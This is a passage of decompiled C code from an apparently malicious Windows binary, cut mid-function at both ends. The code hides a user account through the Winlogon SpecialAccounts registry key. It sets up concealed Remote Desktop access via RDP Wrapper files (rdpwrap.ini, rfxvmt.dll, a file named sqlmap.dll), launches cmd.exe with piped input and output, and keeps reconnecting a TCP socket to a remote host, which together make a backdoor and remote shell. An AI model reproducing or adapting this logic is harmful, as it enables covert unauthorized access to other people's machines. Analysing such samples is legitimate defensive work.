    if (g296 != 0) {
        int32_t v17 = v15; // 0x41208b
        int32_t v18 = 0; // 0x41209d
        function_406d65();
        *(int32_t *)(v17 - 4) = g294 + 4 * v18;
        function_404656((int32_t)&g322);
        v17 -= 8;
        *(int32_t *)v17 = (int32_t)&v14;
        function_410e64((int32_t)&g322);
        function_406f1d();
        v14 = 0;
        v18++;
        v16 = v17;
        while (v18 < g296) {
            // 0x41206f
            function_406d65();
            *(int32_t *)(v17 - 4) = g294 + 4 * v18;
            function_404656((int32_t)&g322);
            v17 -= 8;
            *(int32_t *)v17 = (int32_t)&v14;
            function_410e64((int32_t)&g322);
            function_406f1d();
            v14 = 0;
            v18++;
            v16 = v17;
        }
    }
    // 0x4120a7
    *(int32_t *)(v16 - 4) = 500;
    Sleep((int32_t)&g322);
    *(int32_t *)(v16 - 8) = (int32_t)&g288;
    function_410e64((int32_t)&g322);
    *(int32_t *)(v16 - 12) = 500;
    Sleep((int32_t)&g322);
    *(int32_t *)(v16 - 16) = 0;
    function_410f97((int32_t)&g322);
    function_41344c();
    *(int32_t *)(v16 - 20) = (int32_t)&g283;
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g322);
    return function_406f1d();
}

// Address range: 0x4120e9 - 0x41237d
int32_t function_4120e9(int32_t a1, int32_t a2) {
    int32_t v1 = a1;
    int32_t lpCriticalSection; // bp-44, 0x4120e9
    InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)&lpCriticalSection);
    __asm_rep_movsd_memcpy((char *)&g283, (char *)&lpCriticalSection, 6);
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&lpCriticalSection);
    struct _RTL_CRITICAL_SECTION * v2 = (struct _RTL_CRITICAL_SECTION *)&g283; // bp-68, 0x412113
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g283);
    g302 = a1;
    g299 = &g195;
    g298 = a2;
    int32_t v3 = function_41199f(); // 0x41213a
    struct _RTL_CRITICAL_SECTION ** v4 = &v2; // 0x412147
    struct _RTL_CRITICAL_SECTION * v5; // bp-104, 0x4120e9
    if (v3 == 0) {
        goto lab_0x4121e0;
    } else {
        int32_t v6 = function_40460a(L"rudp"); // 0x412155
        int32_t v7 = function_415532(&v1, v6); // 0x412161
        function_4043c7(v7);
        function_406f1d();
        v1 = 0;
        function_406f1d();
        int32_t v8 = function_40460a(L"rpdp"); // 0x41218d
        int32_t v9 = function_415532(&v1, v8); // 0x412199
        function_4043c7(v9);
        function_406f1d();
        v1 = 0;
        function_406f1d();
        if (function_4045f0() != 0) {
            goto lab_0x412216;
        } else {
            // 0x4121cb
            if (function_4045f0() != 0) {
                goto lab_0x412216;
            } else {
                // 0x4121d9
                v5 = (struct _RTL_CRITICAL_SECTION *)&g283;
                LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g283);
                v4 = &v5;
                goto lab_0x4121e0;
            }
        }
    }
  lab_0x4121e0:;
    int32_t v10 = (int32_t)v4;
    int32_t v11; // 0x4120e9
    if (function_4131f8() < 6) {
        goto lab_0x412349;
    } else {
        // 0x4121ee
        if (function_4131a4() != 0) {
            goto lab_0x412349;
        } else {
            int32_t * v12 = (int32_t *)(v10 - 4);
            if (function_413893() == 1) {
                // 0x412242
                *v12 = 8;
                *v12 = function_4044c4();
                function_4043c7((int32_t)&g322);
                function_406f1d();
                int32_t * v13 = (int32_t *)(v10 - 8); // 0x412260
                *v13 = 8;
                *v13 = function_4044c4();
                function_4043c7((int32_t)&g322);
                function_406f1d();
                int32_t v14; // bp-20, 0x4120e9
                *(int32_t *)(v10 - 12) = (int32_t)&v14;
                int32_t v15; // bp-12, 0x4120e9
                *(int32_t *)(v10 - 16) = (int32_t)&v15;
                *(int32_t *)(v10 - 20) = 0;
                *(int32_t *)(v10 - 24) = 0xf013f;
                *(int32_t *)(v10 - 28) = 0;
                *(int32_t *)(v10 - 32) = 0;
                *(int32_t *)(v10 - 36) = 0;
                *(int32_t *)(v10 - 40) = (int32_t)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList";
                *(int32_t *)(v10 - 44) = -0x7ffffffe;
                RegCreateKeyExA(&g322, (char *)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322, (struct _SECURITY_ATTRIBUTES *)&g322, (int32_t **)&g322, &g322);
                int32_t hKey = 0; // bp-16, 0x4122a1
                *(int32_t *)(v10 - 48) = 4;
                *(int32_t *)(v10 - 52) = (int32_t)&hKey;
                *(int32_t *)(v10 - 56) = 4;
                *(int32_t *)(v10 - 60) = 0;
                *(int32_t *)(v10 - 64) = g300;
                *(int32_t *)(v10 - 68) = v15;
                RegSetValueExW((int32_t *)hKey, (int16_t *)&g322, (int32_t)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322);
                *(int32_t *)(v10 - 72) = v15;
                RegCloseKey(&g322);
                *(int32_t *)(v10 - 76) = (int32_t)&g301;
                *(int32_t *)(v10 - 80) = (int32_t)&g300;
                int32_t v16 = function_410d7a((int32_t)&g322, (int32_t)&g322); // 0x4122d1
                int32_t * v17 = (int32_t *)(v10 - 84);
                if (v16 != 0) {
                    // 0x4122e8
                    *v17 = (int32_t)&g300;
                    *(int32_t *)(v10 - 88) = (int32_t)L"rudp";
                    *(int32_t *)(v10 - 92) = function_40460a((int16_t *)&g322);
                    function_4154ed((int32_t)&g322, (int32_t)&g322);
                    function_406f1d();
                    *(int32_t *)(v10 - 96) = (int32_t)&g301;
                    *(int32_t *)(v10 - 100) = (int32_t)L"rpdp";
                    *(int32_t *)(v10 - 104) = function_40460a((int16_t *)&g322);
                    function_4154ed((int32_t)&g322, (int32_t)&g322);
                    function_406f1d();
                    *(int32_t *)(v10 - 108) = (int32_t)&g283;
                    *(int32_t *)(v10 - 112) = 0x411eb2;
                    function_402746((int32_t)&g322, &g322);
                    *(int32_t *)(v10 - 116) = (int32_t)&g283;
                    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g322);
                    // 0x412376
                    return 1;
                }
                // 0x4122da
                *v17 = (int32_t)&g301;
                *(int32_t *)(v10 - 88) = (int32_t)&g300;
                int32_t v18 = v10 - 92; // 0x4122e4
                *(int32_t *)v18 = 9;
                v11 = v18;
            } else {
                // 0x412205
                *v12 = (int32_t)&g301;
                *(int32_t *)(v10 - 8) = (int32_t)&g300;
                int32_t v19 = v10 - 12; // 0x41220f
                *(int32_t *)v19 = 1;
                v11 = v19;
            }
            goto lab_0x412355;
        }
    }
  lab_0x412349:
    // 0x412349
    *(int32_t *)(v10 - 4) = (int32_t)&g301;
    *(int32_t *)(v10 - 8) = (int32_t)&g300;
    int32_t v20 = v10 - 12; // 0x412353
    *(int32_t *)v20 = 2;
    v11 = v20;
    goto lab_0x412355;
  lab_0x412216:
    // 0x412216
    v5 = (struct _RTL_CRITICAL_SECTION *)&g301;
    int32_t v22 = function_405b49(8, (int32_t)&g300, (int32_t)&g301); // 0x412225
    function_405f32((int32_t *)v22);
    function_405b26();
    // 0x412376
    return 1;
  lab_0x412355:;
    int32_t v21 = function_405b49((int32_t)&g322, (int32_t)&g322, (int32_t)&g322); // 0x412358
    *(int32_t *)(v11 - 4) = v21;
    function_405f32(&g322);
    function_405b26();
    *(int32_t *)(v11 - 8) = (int32_t)&g283;
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g322);
    // 0x412376
    return 0;
}

// Address range: 0x41237d - 0x41254e
int32_t function_41237d(void) {
    // 0x41237d
    int128_t v1; // 0x41237d
    int128_t v2 = v1;
    InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)&g283);
    g284 = 0;
    g285 = 0;
    g286 = 0;
    g287 = 0;
    g288 = 0;
    *(int128_t *)&g289 = (int128_t)__asm_movaps(__asm_xorps(v2, v2));
    g293 = 0;
    g297 = 5;
    g295 = 5;
    g296 = 0;
    int32_t v3 = function_406fa7(); // 0x4123d7
    int32_t v4 = 0; // 0x4123de
    if (v3 != 0) {
        // 0x4123e0
        *(int32_t *)v3 = 5;
        v4 = v3 + 4;
        *(int32_t *)v4 = 0;
        bool v5; // 0x41237d
        int32_t v6 = v5 ? -4 : 4; // 0x4123e9
        int32_t v7 = v4 + v6; // 0x4123e9
        *(int32_t *)v7 = 0;
        int32_t v8 = v7 + v6; // 0x4123ea
        *(int32_t *)v8 = 0;
        int32_t v9 = v8 + v6; // 0x4123eb
        *(int32_t *)v9 = 0;
        *(int32_t *)(v9 + v6) = 0;
    }
    // 0x4123f2
    g294 = v4;
    g300 = 0;
    g301 = 0;
    function_40428f((int32_t)L"TermService");
    function_40428f((int32_t)&g111);
    function_40460a(L"%windir%\\System32");
    function_4043c7(function_404201());
    function_406f1d();
    function_406f1d();
    int32_t * v10; // 0x41237d
    int32_t v11; // bp-44, 0x41237d
    if (function_4138ef() != 1) {
        int32_t v12 = function_404201(); // 0x4124a1
        v11 = v12;
        function_4043c7(v12);
        function_406f1d();
        v10 = &v11;
    } else {
        // 0x412463
        v11 = (int32_t)&g112;
        function_40428f((int32_t)&g112);
        function_4043c7(function_404201());
        function_406f1d();
        int32_t v13 = (int32_t)&g111; // bp-52, 0x41248e
        function_40428f((int32_t)&g111);
        v10 = &v13;
    }
    int32_t v14 = (int32_t)v10;
    *(int32_t *)(v14 - 4) = (int32_t)&g113;
    function_4043fa((int16_t *)&g322);
    *(int32_t *)(v14 - 8) = (int32_t)&g113;
    function_4043fa((int16_t *)&g322);
    int32_t v15 = v14 - 12; // 0x4124d3
    *(int32_t *)v15 = (int32_t)L"\\rfxvmt.dll";
    function_4043fa((int16_t *)&g322);
    function_4133fb();
    g292 = 0;
    int32_t v16 = v15; // 0x4124f7
    if (g291 != 0) {
        // 0x4124f9
        *(int32_t *)(v14 - 16) = g291;
        lstrlenW((int16_t *)&g322);
        int32_t v17 = function_406e8d(); // 0x412507
        *(int32_t *)(v14 - 20) = g291;
        g292 = v17;
        v16 = v14 - 24;
        *(int32_t *)v16 = v17;
        lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
    }
    // 0x41251e
    *(int32_t *)(v16 - 4) = (int32_t)L"\\rdpwrap.ini";
    function_4043fa((int16_t *)&g322);
    *(int32_t *)(v16 - 8) = (int32_t)L"\\sqlmap.dll";
    function_4043fa((int16_t *)&g322);
    *(int32_t *)(v16 - 12) = (int32_t)L"\\sqlmap.dll";
    function_4043fa((int16_t *)&g322);
    return (int32_t)&g283;
}

// Address range: 0x41254e - 0x4125c5
int32_t function_41254e(int32_t lpApplicationName, int32_t a2, int32_t a3, int32_t a4) {
    // 0x41254e
    int32_t lpStartupInfo; // bp-88, 0x41254e
    function_401293(&lpStartupInfo, 0, 68);
    lpStartupInfo = 68;
    int32_t lpProcessInformation; // bp-20, 0x41254e
    bool v1 = CreateProcessW((int16_t *)lpApplicationName, NULL, NULL, NULL, true, 1040, NULL, NULL, (struct _STARTUPINFOW *)&lpStartupInfo, (struct _PROCESS_INFORMATION *)&lpProcessInformation); // 0x4125a3
    int32_t result = 0; // 0x4125ab
    if (v1) {
        // 0x4125ad
        g151 = lpProcessInformation;
        result = 1;
    }
    // 0x4125b6
    function_406f1d();
    return result;
}

// Address range: 0x4125c5 - 0x4125d4
int32_t function_4125c5(int32_t a1) {
    // 0x4125c5
    return function_406f1d();
}

// Address range: 0x4125d4 - 0x4125e3
int32_t function_4125d4(int32_t a1) {
    // 0x4125d4
    return function_406f1d();
}

// Address range: 0x4125e3 - 0x4125ea
int32_t function_4125e3(void) {
    // 0x4125e3
    int32_t result; // 0x4125e3
    *(int32_t *)result = (int32_t)&g116;
    return result;
}

// Address range: 0x4125ea - 0x412657
int32_t function_4125ea(int32_t a1) {
    // 0x4125ea
    int32_t v1; // bp-24, 0x4125ea
    int32_t v2 = &v1; // 0x412605
    int32_t result2; // 0x4125ea
    while (true) {
      lab_0x412622:;
        int32_t v3 = function_412657(); // 0x412624
        result2 = v3;
        if (v3 >= 0 != v3 != 0) {
            // break -> 0x412646
            break;
        }
        int32_t v4 = v2;
        *(int32_t *)(v4 - 4) = *(int32_t *)(a1 + 28);
        *(int32_t *)(v4 - 8) = 0;
        *(int32_t *)(v4 - 12) = v4 + 8;
        v2 = v4 - 16;
        *(int32_t *)v2 = 2;
        int32_t v5 = WaitForMultipleObjects((int32_t)&g322, (int32_t **)&g322, (bool)&g322, (int32_t)&g322); // 0x412613
        int32_t result = 1; // 0x412643
        switch (v5) {
            case 0: {
                int32_t v6 = function_412657(); // 0x412638
                result = v6 >= 0 == (v6 != 0) ? 0 : v6;
              lab_0x412646:
                // 0x412646
                function_412798();
                return result;
            }
            case 1: {
                goto lab_0x412646;
            }
            default: {
                goto lab_0x412622;
            }
        }
    }
    // 0x412646
    function_412798();
    return result2;
}

// Address range: 0x412657 - 0x412798
int32_t function_412657(void) {
    // 0x412657
    int32_t hNamedPipe; // bp-8, 0x412657
    int32_t v1 = &hNamedPipe; // 0x412760
    int32_t v2; // 0x412657
    int32_t * v3 = (int32_t *)(v2 + 8); // 0x412764
    int32_t v4; // bp-12, 0x412657
    int32_t v5 = &v4;
    int32_t v6; // bp-20, 0x412657
    int32_t v7 = &v6;
    int32_t v8; // bp-52, 0x412657
    int32_t v9 = &v8; // 0x412667
    *(int32_t *)(v9 - 4) = 0;
    hNamedPipe = 0;
    *(int32_t *)(v9 - 8) = v1;
    *(int32_t *)(v9 - 12) = 0;
    *(int32_t *)(v9 - 16) = 0;
    *(int32_t *)(v9 - 20) = 0;
    *(int32_t *)(v9 - 24) = *v3;
    while (PeekNamedPipe((int32_t *)hNamedPipe, &g322, (int32_t)&g322, &g322, &g322, &g322)) {
        // 0x41266c
        if (hNamedPipe == 0) {
            // 0x41278e
            return 1;
        }
        int32_t * v10 = (int32_t *)(v9 - 28); // 0x412678
        *v10 = hNamedPipe + 1;
        int32_t hFile = function_401000((int32_t)&g322); // 0x412679
        v4 = 0;
        *v10 = 0;
        *(int32_t *)(v9 - 32) = v5;
        *(int32_t *)(v9 - 36) = hNamedPipe;
        *(int32_t *)(v9 - 40) = hFile;
        *(int32_t *)(v9 - 44) = *v3;
        bool v11 = ReadFile((int32_t *)hFile, &g322, (int32_t)&g322, &g322, (struct _OVERLAPPED *)&g322); // 0x412695
        if (!v11) {
            // break -> 0x412775
            break;
        }
        // 0x4126a3
        *(char *)(v4 + hFile) = 0;
        *(int32_t *)(v9 - 48) = v4;
        *(int32_t *)(v9 - 52) = hFile;
        function_403fc7(0, 0);
        *(int32_t *)(v9 - 56) = 0;
        *(int32_t *)(v9 - 60) = 0;
        *(int32_t *)(v9 - 64) = -1;
        *(int32_t *)(v9 - 68) = hFile;
        *(int32_t *)(v9 - 72) = 0;
        *(int32_t *)(v9 - 76) = 1;
        int32_t v12 = MultiByteToWideChar((int32_t)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, (int16_t *)&g322, (int32_t)&g322); // 0x4126c5
        int32_t v13 = 4 * v12; // 0x4126cf
        int32_t * v14 = (int32_t *)(v9 - 80); // 0x4126d2
        *v14 = v13;
        int32_t v15 = function_401000((int32_t)&g322); // 0x4126d3
        int32_t * v16 = (int32_t *)(v9 - 84); // 0x4126d8
        *v16 = v13;
        int32_t * v17 = (int32_t *)(v9 - 88); // 0x4126db
        *v17 = 0;
        int32_t * v18 = (int32_t *)(v9 - 92); // 0x4126dd
        *v18 = v15;
        function_401293(&g322, (int32_t)&g322, (int32_t)&g322);
        *v14 = v12;
        *v16 = v15;
        *v17 = -1;
        *v18 = hFile;
        *(int32_t *)(v9 - 96) = 0;
        *(int32_t *)(v9 - 100) = 1;
        MultiByteToWideChar((int32_t)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, (int16_t *)&g322, (int32_t)&g322);
        int32_t * v19 = (int32_t *)(v9 - 104); // 0x4126f8
        *v19 = hFile;
        function_401014((int32_t)&g322);
        *v19 = v15;
        function_40460a((int16_t *)&g322);
        *(int32_t *)(v9 - 108) = v7;
        function_403f58((int32_t)&g322);
        function_4040c4();
        *(int32_t *)(v9 - 112) = v7;
        v9 -= 116;
        int32_t v20; // bp-16, 0x412657
        *(int32_t *)v9 = (int32_t)&v20;
        function_404656((int32_t)&g322);
        function_406f1d();
        function_406f1d();
        v20 = 0;
        *(int32_t *)(v9 - 4) = 0;
        hNamedPipe = 0;
        *(int32_t *)(v9 - 8) = v1;
        *(int32_t *)(v9 - 12) = 0;
        *(int32_t *)(v9 - 16) = 0;
        *(int32_t *)(v9 - 20) = 0;
        *(int32_t *)(v9 - 24) = *v3;
    }
    int32_t errorCode = GetLastError(); // 0x412775
    int32_t result = 0; // 0x412782
    if (errorCode != 109) {
        // 0x412784
        result = errorCode != 232;
    }
    // 0x41278e
    return result;
}

// Address range: 0x412798 - 0x41280c
int32_t function_412798(void) {
    // 0x412798
    int32_t v1; // 0x412798
    int32_t * hHandle = (int32_t *)(v1 + 20); // 0x4127a0
    int32_t * v2; // 0x412798
    if (*hHandle == 0) {
        // 0x412798
        v2 = (int32_t *)(v1 + 24);
    } else {
        int32_t threadId = GetCurrentThreadId(); // 0x4127a5
        int32_t * v3 = (int32_t *)(v1 + 24);
        if (threadId != *v3) {
            int32_t hEvent = *(int32_t *)(v1 + 16); // 0x4127b0
            if (hEvent == 0) {
                // 0x412808
                return threadId;
            }
            // 0x4127b6
            SetEvent((int32_t *)hEvent);
            if (WaitForSingleObject((int32_t *)*hHandle, 0x1388) == 258) {
                // 0x4127d3
                TerminateThread((int32_t *)*hHandle, -2);
            }
        }
        // 0x4127dd
        function_412a13();
        v2 = v3;
    }
    // 0x4127e4
    function_412a13();
    function_412a13();
    function_412a13();
    int32_t result = function_412a13(); // 0x4127ff
    *v2 = 0;
    // 0x412808
    return result;
}

// Address range: 0x41280c - 0x412a13
int32_t function_41280c(int32_t a1) {
    int32_t v1 = a1;
    function_412798();
    int32_t lpPipeAttributes = 12; // bp-40, 0x412821
    int32_t hReadPipe = 0; // bp-12, 0x41282c
    struct _SECURITY_ATTRIBUTES * lpTargetHandle = NULL; // bp-16, 0x412833
    int32_t hWritePipe = 0; // bp-8, 0x41283a
    int32_t ** v2 = (int32_t **)&hReadPipe; // bp-68, 0x41283d
    int32_t hWritePipe2 = 0; // bp-20, 0x41283e
    int32_t hReadPipe2 = 0; // bp-24, 0x412843
    bool v3 = CreatePipe((int32_t **)&hReadPipe, (int32_t **)&hWritePipe, (struct _SECURITY_ATTRIBUTES *)&lpPipeAttributes, 0); // 0x412850
    int32_t v4 = (int32_t)&v2; // 0x41285e
    if (v3) {
        int32_t * processHandle = GetCurrentProcess(); // 0x412864
        int32_t * processHandle2 = GetCurrentProcess(); // 0x41286f
        int32_t v5 = (int32_t)processHandle2; // bp-96, 0x412885
        bool v6 = DuplicateHandle(processHandle2, (int32_t *)hWritePipe, processHandle, (int32_t **)&lpTargetHandle, 0, true, 2); // 0x412886
        v4 = &v5;
        if (v6) {
            int32_t ** v7 = (int32_t **)&hReadPipe2; // bp-112, 0x4128a4
            bool v8 = CreatePipe((int32_t **)&hReadPipe2, (int32_t **)&hWritePipe2, (struct _SECURITY_ATTRIBUTES *)&lpPipeAttributes, 0); // 0x4128a5
            v4 = (int32_t)&v7;
            if (v8) {
                int32_t * processHandle3 = GetCurrentProcess(); // 0x4128b3
                int32_t * processHandle4 = GetCurrentProcess(); // 0x4128be
                int32_t v9 = (int32_t)processHandle4; // bp-140, 0x4128d1
                bool v10 = DuplicateHandle(processHandle4, (int32_t *)hReadPipe, processHandle3, (int32_t **)&g152, 0, false, 2); // 0x4128d5
                v4 = &v9;
                if (v10) {
                    int32_t * processHandle5 = GetCurrentProcess(); // 0x4128e3
                    int32_t * processHandle6 = GetCurrentProcess(); // 0x4128ee
                    int32_t v11 = (int32_t)processHandle6; // bp-168, 0x412901
                    int32_t v12 = &v11; // 0x412901
                    bool v13 = DuplicateHandle(processHandle6, (int32_t *)hWritePipe2, processHandle5, (int32_t **)&g153, 0, false, 2); // 0x412905
                    v4 = v12;
                    if (v13) {
                        int32_t hObject = hReadPipe; // 0x412913
                        int32_t v14 = v12; // 0x412917
                        if (hObject != 0) {
                            int32_t v15 = hObject; // bp-172, 0x412919
                            CloseHandle((int32_t *)hObject);
                            v14 = &v15;
                        }
                        // 0x41291e
                        hReadPipe = 0;
                        int32_t v16 = hWritePipe2; // 0x412923
                        int32_t v17 = v14; // 0x412926
                        if (v16 != 0) {
                            // 0x412928
                            v17 = v14 - 4;
                            *(int32_t *)v17 = v16;
                            CloseHandle((int32_t *)hReadPipe);
                        }
                        // 0x41292d
                        *(int32_t *)(v17 - 4) = (int32_t)lpTargetHandle;
                        hWritePipe2 = 0;
                        *(int32_t *)(v17 - 8) = hReadPipe2;
                        *(int32_t *)(v17 - 12) = hWritePipe;
                        *(int32_t *)(v17 - 16) = 0;
                        int32_t v18 = v17 - 20; // 0x412941
                        *(int32_t *)v18 = (int32_t)&v1;
                        function_404656(hWritePipe2);
                        int32_t v19 = function_41254e((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322); // 0x412947
                        v4 = v18;
                        if (v19 != 0) {
                            int32_t v20 = hWritePipe; // 0x412950
                            int32_t v21 = v18; // 0x412953
                            if (v20 != 0) {
                                // 0x412955
                                v21 = v17 - 24;
                                *(int32_t *)v21 = v20;
                                CloseHandle(&g322);
                            }
                            // 0x41295a
                            hWritePipe = 0;
                            int32_t v22 = hReadPipe2; // 0x41295d
                            int32_t v23 = v21; // 0x412960
                            if (v22 != 0) {
                                // 0x412962
                                v23 = v21 - 4;
                                *(int32_t *)v23 = v22;
                                CloseHandle((int32_t *)hWritePipe);
                            }
                            // 0x412967
                            hReadPipe2 = 0;
                            struct _SECURITY_ATTRIBUTES * v24 = lpTargetHandle; // 0x41296a
                            int32_t v25 = v23; // 0x41296d
                            if (v24 != NULL) {
                                // 0x41296f
                                v25 = v23 - 4;
                                *(int32_t *)v25 = (int32_t)v24;
                                CloseHandle((int32_t *)hReadPipe2);
                            }
                            // 0x412974
                            *(int32_t *)(v25 - 4) = 0;
                            *(int32_t *)(v25 - 8) = 0;
                            *(int32_t *)(v25 - 12) = 1;
                            *(int32_t *)(v25 - 16) = 0;
                            lpTargetHandle = NULL;
                            int32_t * v26 = CreateEventA(NULL, (bool)&g322, (bool)&g322, (char *)&g322); // 0x41297c
                            *(int32_t *)(v25 - 20) = (int32_t)&g156;
                            *(int32_t *)(v25 - 24) = 0;
                            *(int32_t *)(v25 - 28) = (int32_t)&g150;
                            *(int32_t *)(v25 - 32) = 0x4125ea;
                            *(int32_t *)(v25 - 36) = 0;
                            int32_t v27 = v25 - 40; // 0x412993
                            *(int32_t *)v27 = 0;
                            g154 = (int32_t)v26;
                            int32_t * threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)&g322, (int32_t)&g322, (int32_t (*)(int32_t *))&g322, &g322, (int32_t)&g322, &g322); // 0x412999
                            g155 = (int32_t)threadHandle;
                            v4 = v27;
                            if (threadHandle != NULL) {
                                // 0x412a02
                                function_406f1d();
                                return 1;
                            }
                        }
                    }
                }
            }
        }
    }
    int32_t v28 = hReadPipe; // 0x4129b2
    int32_t v29 = v4; // 0x4129b6
    if (v28 != 0) {
        // 0x4129b8
        v29 = v4 - 4;
        *(int32_t *)v29 = v28;
        CloseHandle(&g322);
    }
    int32_t v30 = hWritePipe; // 0x4129bd
    hReadPipe = 0;
    int32_t v31 = v29; // 0x4129c4
    if (v30 != 0) {
        // 0x4129c6
        v31 = v29 - 4;
        *(int32_t *)v31 = v30;
        CloseHandle((int32_t *)hReadPipe);
    }
    struct _SECURITY_ATTRIBUTES * v32 = lpTargetHandle; // 0x4129cb
    hWritePipe = 0;
    int32_t v33 = v31; // 0x4129d2
    if (v32 != NULL) {
        // 0x4129d4
        v33 = v31 - 4;
        *(int32_t *)v33 = (int32_t)v32;
        CloseHandle((int32_t *)hWritePipe);
    }
    int32_t v34 = hWritePipe2; // 0x4129d9
    lpTargetHandle = NULL;
    int32_t v35 = v33; // 0x4129e0
    if (v34 != 0) {
        // 0x4129e2
        v35 = v33 - 4;
        *(int32_t *)v35 = v34;
        CloseHandle(&lpTargetHandle->e0);
    }
    int32_t v36 = hReadPipe2; // 0x4129e7
    hWritePipe2 = 0;
    if (v36 != 0) {
        // 0x4129f0
        *(int32_t *)(v35 - 4) = v36;
        CloseHandle((int32_t *)hWritePipe2);
    }
    // 0x4129f5
    hReadPipe2 = 0;
    function_412798();
    // 0x412a02
    function_406f1d();
    return 0;
}

// Address range: 0x412a13 - 0x412a28
int32_t function_412a13(void) {
    // 0x412a13
    int32_t v1; // 0x412a13
    int32_t * hObject = (int32_t *)v1;
    int32_t handleClosed; // 0x412a13
    if (v1 != 0) {
        // 0x412a1b
        handleClosed = CloseHandle(hObject);
    }
    // 0x412a23
    *hObject = 0;
    return handleClosed;
}

// Address range: 0x412a28 - 0x412a57
int32_t function_412a28(void) {
    int128_t v1 = __asm_movaps_1(g137); // 0x412a28
    g152 = NULL;
    g153 = 0;
    g151 = 0;
    *(int32_t *)&g150 = (int32_t)&g116;
    __asm_movups(g154, v1);
    return (int32_t)&g150;
}

// Address range: 0x412a57 - 0x412aa5
int32_t function_412a57(int32_t lpBuffer) {
    int32_t result = 0; // 0x412a63
    if (g153 != 0) {
        // 0x412a69
        function_404197();
        int32_t lpNumberOfBytesWritten = 0; // bp-8, 0x412a72
        int32_t nNumberOfBytesToWrite = function_4040c4(); // 0x412a79
        bool v1 = WriteFile((int32_t *)g153, (int32_t *)lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, NULL); // 0x412a8e
        result = v1;
    }
    // 0x412a96
    function_406f1d();
    return result;
}

// Address range: 0x412aa5 - 0x412ae1
int32_t function_412aa5(int32_t a1) {
    int32_t v1 = a1;
    function_404656((int32_t)&v1);
    int32_t v2 = function_405a39((int32_t)&g322); // 0x412abf
    function_405f32((int32_t *)v2);
    function_4059d7();
    return function_406f1d();
}

// Address range: 0x412ae1 - 0x412b1d
int32_t function_412ae1(int32_t a1) {
    int32_t v1 = a1;
    function_404656((int32_t)&v1);
    int32_t v2 = function_405a39((int32_t)&g322); // 0x412afb
    function_405f32((int32_t *)v2);
    function_4059d7();
    return function_406f1d();
}

// Address range: 0x412b1d - 0x412b24
int32_t function_412b1d(void) {
    // 0x412b1d
    int32_t result; // 0x412b1d
    *(int32_t *)result = (int32_t)&g116;
    return result;
}

// Address range: 0x412b24 - 0x412b2a
int32_t function_412b24(void) {
    // 0x412b24
    return g158;
}

// Address range: 0x412b2a - 0x412b3b
int32_t function_412b2a(void) {
    // 0x412b2a
    g158 = 0;
    return function_412798();
}

// Address range: 0x412b3b - 0x412b85
int32_t function_412b3b(int32_t a1) {
    int32_t v1 = a1;
    g157 = a1;
    function_413915();
    function_4043fa(L"\\cmd.exe");
    function_404656((int32_t)&v1);
    function_41280c((int32_t)&g322);
    g158 = 1;
    return function_406f1d();
}

// Address range: 0x412b85 - 0x412ba8
int32_t function_412b85(void) {
    // 0x412b85
    function_412a28();
    g157 = 0;
    g158 = 0;
    *(int32_t *)&g150 = (int32_t)&g117;
    return (int32_t)&g150;
}

// Address range: 0x412ba8 - 0x412bbd
int32_t function_412ba8(int32_t a1, int32_t a2) {
    // 0x412ba8
    int32_t v1; // 0x412ba8
    function_413153(v1);
    return 1;
}

// Address range: 0x412bbd - 0x412bca
int32_t function_412bbd(void) {
    // 0x412bbd
    g194 = 0;
    return &g194;
}

// Address range: 0x412bca - 0x412c20
int32_t function_412bca(int32_t a1) {
    // 0x412bca
    int32_t v1; // bp-408, 0x412bca
    WSAStartup(2, (struct WSAData *)&v1);
    if (function_412c20() == -1) {
        // 0x412bfa
        WSACleanup();
    }
    // 0x412c00
    function_401293(&g176, 0, 0x13332c);
    return function_412cd5();
}

// Address range: 0x412c20 - 0x412cd5
int32_t function_412c20(void) {
    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // 0x412c3a
    int32_t name; // 0x412c20
    int32_t v1 = (int32_t)gethostbyname((char *)name); // 0x412c43
    int16_t v2 = *(int16_t *)(v1 + 10); // 0x412c49
    int32_t v3 = *(int32_t *)*(int32_t *)(v1 + 12); // 0x412c54
    int32_t v4; // bp-16, 0x412c20
    function_40126d(&v4, (int32_t *)v3, (int32_t)v2);
    int16_t v5 = 2; // bp-20, 0x412c63
    htons((int16_t)name);
    int32_t v6; // bp-2076, 0x412c20
    function_401293(&v6, 0, 2050);
    int32_t v7 = 2; // bp-2128, 0x412c97
    InetNtopW(2, &v4, (int16_t *)&v6, 2050);
    if (g162 != 0) {
        // 0x412cce
        return sock_fd;
    }
    int32_t v8 = &v7; // 0x412ca9
    *(int32_t *)(v8 - 4) = 16;
    *(int32_t *)(v8 - 8) = (int32_t)&v5;
    v8 -= 12;
    *(int32_t *)v8 = sock_fd;
    int32_t v9 = connect((int32_t)&g322, (struct sockaddr *)&g322, (int32_t)&g322); // 0x412cb1
    char v10 = v9 != -1 ? 1 : g162; // 0x412cc4
    g162 = v10;
    while (v10 == 0) {
        // 0x412caa
        *(int32_t *)(v8 - 4) = 16;
        *(int32_t *)(v8 - 8) = (int32_t)&v5;
        v8 -= 12;
        *(int32_t *)v8 = sock_fd;
        v9 = connect((int32_t)&g322, (struct sockaddr *)&g322, (int32_t)&g322);
        v10 = v9 != -1 ? 1 : g162;
        g162 = v10;
    }
    // 0x412cce
    return sock_fd;
}

// Address range: 0x412cd5 - 0x412ecc
int32_t function_412cd5(void) {
    // 0x412cd5
    bool v1; // 0x412cd5
    int32_t v2 = v1 ? -4 : 4;
    int64_t v3; // bp-28, 0x412cd5
    int32_t v4 = v2 + (int32_t)&v3;
    int32_t v5; // bp-2156, 0x412cd5
